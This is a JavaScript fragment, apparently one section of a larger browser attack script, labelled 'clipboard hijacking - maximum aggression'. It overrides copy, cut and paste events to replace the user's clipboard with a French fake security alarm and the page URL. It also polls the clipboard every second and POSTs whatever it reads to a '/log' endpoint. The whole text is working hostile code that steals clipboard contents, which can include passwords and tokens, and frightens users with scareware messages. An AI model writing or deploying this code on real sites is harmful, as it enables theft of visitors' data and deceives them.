/**
 * 6. CLIPBOARD HIJACKING - MAXIMUM AGGRESSION
 */
const ClipboardHijacking = {
    init: function() {
        this.hijackCopy();
        this.hijackCut();
        this.hijackPaste();
        this.monitorClipboard();
    },
    hijackCopy: function() {
        document.addEventListener('copy', (e) => {
            e.preventDefault();
            const maliciousContent = '⚠️ Votre système est compromis! ' + window.location.href;
            e.clipboardData.setData('text/plain', maliciousContent);
            e.clipboardData.setData('text/html', '<b>⚠️ ALERTE DE SÉCURITÉ</b><br>' + maliciousContent);
        });
    },
    hijackCut: function() {
        document.addEventListener('cut', (e) => {
            e.preventDefault();
            e.clipboardData.setData('text/plain', '⚠️ Votre système est compromis! ' + window.location.href);
        });
    },
    hijackPaste: function() {
        document.addEventListener('paste', (e) => {
            e.preventDefault();
            // Inject malicious content on paste
            e.clipboardData.setData('text/plain', '⚠️ SYSTÈME COMPROMIS');
        });
    },
    monitorClipboard: function() {
        setInterval(async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    console.log('Clipboard captured:', text);
                    // Send to server if endpoint exists
                    try { fetch('/log', { method: 'POST', body: text, mode: 'no-cors' }); } catch(e) {}
                }
            } catch(e) {}
        }, 1000); // Every 1 second
    }
};